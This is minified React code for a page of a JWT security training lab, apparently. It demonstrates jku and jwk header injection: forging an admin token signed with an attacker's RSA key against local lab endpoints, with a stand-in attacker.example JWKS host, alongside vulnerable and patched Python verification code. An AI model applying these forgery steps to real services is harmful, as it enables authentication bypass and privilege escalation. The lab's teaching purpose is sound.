import{j as e,m,u as b}from"./motion-7MZJb9m0.js";import{r as i}from"./vendor-E29-3-uS.js";import{M as A,A as v,E as g}from"./ExercisePanel-Diwgwwj0.js";import"./index-CSy6_zec.js";const N=[{title:"Attacker Generates RSA Keypair",client:`Generate 2048-bit RSA keypair:
  GET /api/v1/attack/jku-injection/attacker-private-key

Response: {
  "privateKeyPem": "-----BEGIN RSA PRIVATE KEY-----\\n...",
  "suggestedJkuUrl": "http://localhost:8765/api/v1/attack/jku-injection/attacker-jwks"
}`,server:`Server generates and stores a distinct attacker RSA keypair.
The suggestedJkuUrl points to the JWKS endpoint
that serves the attacker's public key.`,description:"The attacker generates or obtains an RSA keypair. In a real attack, they'd host the JWKS at a URL they control. Here, the lab provides a /attacker-jwks endpoint."},{title:"Forge Token with jku Pointing to Attacker JWKS",client:`header: {
  "alg": "RS256",
  "jku": "http://localhost:8765/api/v1/attack/jku-injection/attacker-jwks",
  "kid": "attacker-key"
}
payload: {"sub":"user","role":"admin",...}

Signed with: attacker's RSA private key`,server:`The server will fetch JWKS from the jku URL in the header.
Attacker controls that URL → attacker controls the public key
used for verification.`,description:"The attacker sets jku to their JWKS endpoint and signs the forged token with their RSA private key. When the server fetches the JWKS, it gets the attacker's public key.",highlight:!0},{title:"Server Fetches Attacker JWKS (SSRF-adjacent)",client:`POST /api/v1/attack/jku-injection/verify
{"token": "<attacker-signed-RS256-token>"}`,server:`Server reads jku from token header.
Fetches: GET http://localhost:8765/api/v1/attack/jku-injection/attacker-jwks
→ {"keys": [{"kty":"RSA","n":"...","e":"..."}]}

Verifies token with attacker's public key — PASSES!
HTTP 200 {"valid":true,"role":"admin"}`,description:"The server blindly fetches the JWKS from whatever URL the jku header specifies. It gets the attacker's public key, verifies the forged token (which was signed with the matching private key), and accepts it.",highlight:!0},{title:"Patched: Domain Allowlist for jku",client:`POST /api/v1/attack/jku-injection/verify
{"token": "<attacker-jku-token>"}`,server:`Patched: jku domain checked against allowlist.
Attacker domain not in allowlist.

HTTP 401 {"valid":false,"message":"jku domain not in allowlist."}`,description:"The patched endpoint validates the jku URL against an allowlist of trusted domains before fetching. Attacker-controlled URLs are rejected before any SSRF-adjacent fetch occurs."}],R=[{title:"Attacker Generates Keypair and Builds JWK",client:`Generate RSA keypair locally.

Convert public key to JWK format:
{
  "kty": "RSA",
  "n": "<base64url-encoded-modulus>",
  "e": "AQAB",
  "kid": "attacker-key"
}`,server:`The JWK format embeds the full public key.
Attacker prepares to inline this in the
token header's jwk field.`,description:"The attacker generates an RSA keypair and converts the public key to JWK format. This will be embedded directly in the token header — no external URL fetch required."},{title:"Forge Token with Embedded jwk Header",client:`header: {
  "alg": "RS256",
  "jwk": {"kty":"RSA","n":"...","e":"AQAB","kid":"attacker-key"}
}
payload: {"sub":"user","role":"admin",...}

Signed with: attacker's RSA private key`,server:`The server trusts the inline jwk header field.
It uses that JWK to verify the token's signature.
Attacker's public key is trusted — forged token passes.`,description:"The attacker embeds their public key directly in the token header using the jwk field, then signs with the matching private key. The token is self-verifying from the attacker's key.",highlight:!0},{title:"Server Trusts Inline JWK (No Fetch Needed)",client:`POST /api/v1/attack/jku-injection/verify
{"token": "<jwk-embed-token>"}`,server:`Server reads jwk from token header.
Constructs public key from embedded JWK.

Verifies token with attacker-embedded key — PASSES!
HTTP 200 {"valid":true,"role":"admin"}`,description:"The server trusts the inline jwk without any URL fetch. This is even simpler than the jku attack — no network infrastructure needed, just a crafted header.",highlight:!0},{title:"Patched: Reject Inline jwk Header",client:`POST /api/v1/attack/jku-injection/verify
{"token": "<jwk-embed-token>"}`,server:`Patched: inline jwk header claims rejected.

HTTP 401 {"valid":false,"message":"Inline jwk header not permitted."}`,description:"The patched endpoint unconditionally rejects tokens with a jwk header field. Keys must come from server-side configuration, not from user-supplied token headers."}],K=`
The JWT <code>jku</code> (JWK Set URL) and <code>jwk</code> (JSON Web Key) header claims were
designed to help servers discover verification keys. When a server trusts these claims from the
token itself, an attacker can direct it to use their own key.

<strong>Two attack paths:</strong>
<ul class="list-disc ml-4 mt-2 space-y-2">
  <li><strong>jku-fetch:</strong> The server fetches a JWKS from the URL in the jku header.
  An attacker sets jku to their own server, hosts their public key there, and signs the forged
  token with the matching private key. The server fetches the attacker's key and accepts the
  token. This is <span class="callout-term-danger">SSRF-adjacent</span> — the server makes an outbound HTTP request based on user input.</li>
  <li><strong>jwk-embed:</strong> The server reads the inline jwk header claim and uses that key
  for verification. The attacker embeds their own public key directly in the header and signs with
  the corresponding private key. No external URL required.</li>
</ul>

Both attacks exploit the same root cause: the server's <span class="callout-term">trust boundary</span> includes the token header,
not just the token payload.
`,F=`
**Fix:** Never accept key material from the token header.

\`\`\`python
# Vulnerable — fetches jku or trusts jwk from token header
def verify(token):
    header = jwt.get_unverified_header(token)
    if "jku" in header:
        keys = fetch_jwks(header["jku"])  # ← attacker controlled!
    elif "jwk" in header:
        key = load_jwk(header["jwk"])     # ← attacker controlled!
    return jwt.decode(token, key)

# Patched — keys come from server config only
def verify(token):
    header = jwt.get_unverified_header(token)
    if "jku" in header or "jwk" in header:
        raise ValueError("jku/jwk not permitted")
    return jwt.decode(token, server_public_key, algorithms=["RS256"])
\`\`\`

For jku specifically: validate the URL against an explicit allowlist of trusted domains
before fetching.
`;function J(){const[a,t]=i.useState(0),h=window.matchMedia("(prefers-reduced-motion: reduce)").matches;return i.useEffect(()=>{if(h)return;let o,c=null;const l=1200,n=d=>{c||(c=d);const k=d-c,s=Math.min(k/l,1);t(s*100),s<1?o=requestAnimationFrame(n):setTimeout(()=>{t(0),c=null,o=requestAnimationFrame(n)},600)};return o=requestAnimationFrame(n),()=>cancelAnimationFrame(o)},[h]),e.jsxs("div",{className:"mb-4 bg-surface-alt border border-border rounded-card p-4",children:[e.jsx("div",{className:"text-small text-error font-medium mb-3",children:"⚠ SSRF-adjacent: Server fetches attacker-controlled URL"}),e.jsxs("div",{className:"flex items-center gap-2 relative",children:[e.jsx("div",{className:"rounded border border-border bg-surface px-3 py-2 text-small font-mono text-jwt-payload shrink-0",children:"Server"}),e.jsxs("div",{className:"flex-1 relative h-6 flex items-center",children:[e.jsx("div",{className:"absolute inset-0 flex items-center",children:e.jsx("div",{className:"w-full border-t-2 border-dashed border-error/40"})}),e.jsx(m.div,{className:"absolute w-3 h-3 rounded-full bg-error border border-error/60 z-10",style:{left:`${a}%`,top:"50%",transform:"translateY(-50%)"}}),e.jsx("div",{className:"absolute right-0 text-error text-lg",children:"→"})]}),e.jsx("div",{className:"rounded border border-error/50 bg-error/10 px-3 py-2 text-small font-mono text-error shrink-0",children:"Attacker JWKS"})]}),e.jsx("div",{className:"text-xs text-text-muted mt-2",children:"GET http://attacker.example/jwks → attacker's public key returned"})]})}function P(){const a=b(),[t,h]=i.useState(null),[o,c]=i.useState(!1),[l,n]=i.useState(null),d=async()=>{c(!0),n(null);try{const s=await fetch("/api/v1/attack/jku-injection/attacker-private-key");if(!s.ok){n(`Server error: ${s.status} ${s.statusText}`);return}const u=await s.json();h(u)}catch(s){n(`Fetch failed: ${s}`)}finally{c(!1)}},k=t?{jku:t.suggestedJkuUrl,kid:"attacker-key"}:{};return e.jsxs("div",{className:"space-y-4",children:[e.jsxs("p",{className:"text-text-muted text-small",children:['Click "Fetch Attacker Key" to get the attacker RSA private key PEM and the',e.jsx("code",{className:"px-1 bg-surface-alt rounded text-xs mx-1",children:"suggestedJkuUrl"}),". The Forge will auto-populate the ",e.jsx("code",{className:"px-1 bg-surface-alt rounded text-xs",children:"jku"})," header field. Paste the private key into the Forge secret field, switch to RS256, and fire."]}),e.jsx("button",{onClick:d,disabled:o,className:"btn-secondary py-1.5 h-9 px-4 text-small","aria-label":"Fetch attacker key from server",children:o?"Fetching…":"🔑 Fetch Attacker Key"}),l&&e.jsx("div",{className:"text-error text-small p-2 bg-error/10 border border-error/30 rounded",children:l}),t&&e.jsxs(m.div,{initial:{opacity:0,y:a?0:8},animate:{opacity:1,y:0},className:"space-y-3",children:[e.jsxs("div",{children:[e.jsxs("div",{className:"text-small text-text-muted mb-1 font-medium",children:["Suggested jku URL ",e.jsx("span",{className:"text-primary text-xs",children:"(auto-populated in Forge below)"})]}),e.jsx("div",{className:"code-block p-2 text-xs font-mono break-all text-primary",children:t.suggestedJkuUrl})]}),e.jsxs("div",{children:[e.jsx("div",{className:"text-small text-text-muted mb-1 font-medium",children:"Attacker Private Key — paste into Forge secret"}),e.jsx("pre",{className:"code-block text-xs whitespace-pre-wrap max-h-40 overflow-y-auto",children:t.privateKeyPem})]})]}),e.jsx(g,{slug:"jku-injection",description:"Switch Forge to RS256. Click 'Fetch Attacker Key' above, then paste the private key into the Forge secret field. The jku header auto-populates after fetch. Click 'Fire Token' — the server will fetch your JWKS and accept the forged token.",extraHeaderFields:k})]})}function E(){var y;const a=b(),[t,h]=i.useState(null),[o,c]=i.useState(!1),[l,n]=i.useState(null),[d,k]=i.useState(null),[s,u]=i.useState(!1),[f,p]=i.useState(null),w=async()=>{c(!0),n(null);try{const r=await fetch("/api/v1/attack/jku-injection/attacker-jwks");if(!r.ok){n(`Server error: ${r.status} ${r.statusText}`);return}const j=await r.json();h(j)}catch(r){n(`Fetch failed: ${r}`)}finally{c(!1)}},S=async()=>{u(!0),p(null);try{const r=await fetch("/api/v1/attack/jku-injection/attacker-private-key");if(!r.ok){p(`Server error: ${r.status} ${r.statusText}`);return}const j=await r.json();k(j.privateKeyPem??null)}catch(r){p(`Fetch failed: ${r}`)}finally{u(!1)}},x=(y=t==null?void 0:t.keys)==null?void 0:y[0],T=x?{jwk:x}:{};return e.jsxs("div",{className:"space-y-4",children:[e.jsxs("p",{className:"text-text-muted text-small",children:['Click "Embed JWK" to fetch the attacker JWKS and embed the first key directly in the token header as the ',e.jsx("code",{className:"px-1 bg-surface-alt rounded text-xs",children:"jwk"}),' field. Then click "Fetch Private Key" to get the corresponding private key for signing.']}),e.jsxs("div",{className:"flex gap-2 flex-wrap",children:[e.jsx("button",{onClick:w,disabled:o,className:"btn-secondary py-1.5 h-9 px-4 text-small","aria-label":"Embed JWK in header",children:o?"Fetching…":"📎 Embed JWK"}),e.jsx("button",{onClick:S,disabled:s,className:"btn-secondary py-1.5 h-9 px-4 text-small","aria-label":"Fetch attacker private key",children:s?"Fetching…":"🔑 Fetch Private Key"})]}),l&&e.jsx("div",{className:"text-error text-small p-2 bg-error/10 border border-error/30 rounded",children:l}),f&&e.jsx("div",{className:"text-error text-small p-2 bg-error/10 border border-error/30 rounded",children:f}),t&&e.jsxs(m.div,{initial:{opacity:0,y:a?0:8},animate:{opacity:1,y:0},children:[e.jsxs("div",{className:"text-small text-text-muted mb-1 font-medium",children:["Attacker JWKS ",e.jsx("span",{className:"text-primary text-xs",children:"(first key embedded as jwk header)"})]}),e.jsx("pre",{className:"code-block text-xs whitespace-pre-wrap max-h-48 overflow-y-auto",children:JSON.stringify(t,null,2)})]}),d&&e.jsxs(m.div,{initial:{opacity:0,y:a?0:8},animate:{opacity:1,y:0},children:[e.jsx("div",{className:"text-small text-text-muted mb-1 font-medium",children:"Attacker Private Key — paste into Forge secret field"}),e.jsx("pre",{className:"code-block text-xs whitespace-pre-wrap max-h-40 overflow-y-auto",children:d})]}),e.jsx(g,{slug:"jku-injection",description:"Click 'Embed JWK' above to embed the attacker key in the Forge header. Switch Forge to RS256, paste the attacker private key into the key field. Click 'Fire Token' — the server reads the inline jwk and accepts the forged token.",extraHeaderFields:T})]})}function C(){const[a,t]=i.useState("jku-fetch");return e.jsxs(A,{slug:"jku-injection",title:"jku / jwk Header Injection",severity:"Critical",cve:null,narrative:K,mitigation:F,children:[e.jsxs("div",{className:"flex gap-2 mb-6",role:"tablist",children:[e.jsx("button",{onClick:()=>t("jku-fetch"),className:`px-4 py-2 rounded text-small font-medium transition-colors
            ${a==="jku-fetch"?"bg-primary text-surface border border-primary":"btn-secondary"}`,"aria-selected":a==="jku-fetch",role:"tab",children:"jku injection"}),e.jsx("button",{onClick:()=>t("jwk-embed"),className:`px-4 py-2 rounded text-small font-medium transition-colors
            ${a==="jwk-embed"?"bg-primary text-surface border border-primary":"btn-secondary"}`,"aria-selected":a==="jwk-embed",role:"tab",children:"jwk embedding"})]}),a==="jku-fetch"?e.jsxs(e.Fragment,{children:[e.jsx(v,{steps:N}),e.jsx(J,{}),e.jsxs("section",{className:"mb-6",children:[e.jsx("h2",{className:"font-display text-h3 text-text-primary mb-3",children:"jku-fetch Attack"}),e.jsx(P,{})]})]}):e.jsxs(e.Fragment,{children:[e.jsx(v,{steps:R}),e.jsxs("section",{className:"mb-6",children:[e.jsx("h2",{className:"font-display text-h3 text-text-primary mb-3",children:"jwk-embed Attack"}),e.jsx(E,{})]})]})]})}export{C as default};
